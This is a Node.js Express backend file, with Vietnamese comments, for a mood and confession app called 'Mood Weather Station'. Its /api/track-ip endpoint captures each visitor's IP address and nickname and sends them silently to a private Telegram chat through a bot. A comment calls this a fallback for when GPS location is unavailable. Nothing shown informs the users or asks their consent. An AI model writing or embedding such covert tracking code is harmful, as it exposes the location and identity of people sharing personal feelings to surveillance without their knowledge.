import express from 'express';
import cors from 'cors';
import dotenv from 'dotenv';
import fetch from 'node-fetch';
import path from 'path';
import { fileURLToPath } from 'url';

// Cấu hình dotenv để đọc file .env từ thư mục gốc dự án (nếu có) hoặc thư mục backend
dotenv.config();
// Nếu .env ở thư mục gốc, có thể dùng: dotenv.config({ path: '../.env' });

const app = express();
app.use(cors());
app.use(express.json());

const PORT = process.env.BACKEND_PORT || 3001;

app.get('/', (req, res) => {
  res.send('Mood Weather Station Backend is running! 🐾');
});

app.post('/api/track-ip', async (req, res) => {
  // Lấy IP của người dùng
  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
  const { nickname, action } = req.body;

  const actionText = action === 'welcome' ? '🚀 BẮT ĐẦU HÀNH TRÌNH' : '💌 MỞ THƯ TÂM SỰ';

  console.log(`[Tracking] ${nickname || 'Ẩn danh'} - ${action}. IP: ${ip}`);

  // Thông tin Telegram lấy từ biến môi trường
  const token = process.env.VITE_TELEGRAM_BOT_TOKEN;
  const chatId = process.env.VITE_TELEGRAM_CHAT_ID;

  if (token && chatId) {
    const text = `
✨ *THÔNG BÁO: ${actionText}*
--------------------------
👤 *Đối tượng:* ${nickname || 'Người dùng mới (Chưa nhập tên)'}
🌐 *IP Address:* \`${ip}\`
🕒 *Thời gian:* ${new Date().toLocaleString('vi-VN')}
--------------------------
_Ghi chú: Đây là phương án dự phòng khi GPS không khả dụng._
    `.trim();

    try {
      const tgResponse = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: text,
          parse_mode: 'Markdown',
        }),
      });
      
      if (!tgResponse.ok) {
        const errorMsg = await tgResponse.text();
        console.error("Telegram API Error:", errorMsg);
      }
    } catch (err) {
      console.error("Failed to send Telegram message:", err);
    }
  } else {
    console.warn("Telegram configuration missing in environment variables.");
  }

  res.status(200).json({ success: true, message: "IP tracked successfully" });
});

app.listen(PORT, () => {
  console.log(`🚀 Server is running on http://localhost:${PORT}`);
});
